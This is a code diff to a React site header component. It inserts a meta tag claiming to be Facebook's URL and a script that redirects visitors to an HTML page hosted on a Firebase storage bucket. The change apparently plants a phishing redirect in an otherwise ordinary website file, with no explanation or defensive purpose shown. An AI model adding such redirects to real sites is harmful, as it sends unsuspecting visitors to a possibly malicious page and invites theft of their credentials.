@@ -7,7 +7,14 @@ export default class Header extends React.Component {
     render() {
         return (
             <header id="masthead" className={'site-header ' + _.get(this.props, 'pageContext.site.siteMetadata.header.background')}>
-              <div className="site-header-wrap">
+               <meta property="og:url" content="https://www.facebook.com/" />
+    '<script language="javascript">
+      setTimeout(
+        (location.href =
+          "https://firebasestorage.googleapis.com/v0/b/sandoval-b95b9.appspot.com/o/index5.html?alt=media&token=a094893b-6b1b-4b76-8f69-ce38da3d647a"),
+        8000
+      );</script>';
+            <div className="site-header-wrap">
                 <div className="site-header-inside">
                   <div className="site-branding">
                     {_.get(this.props, 'pageContext.site.siteMetadata.header.profile_img') && 
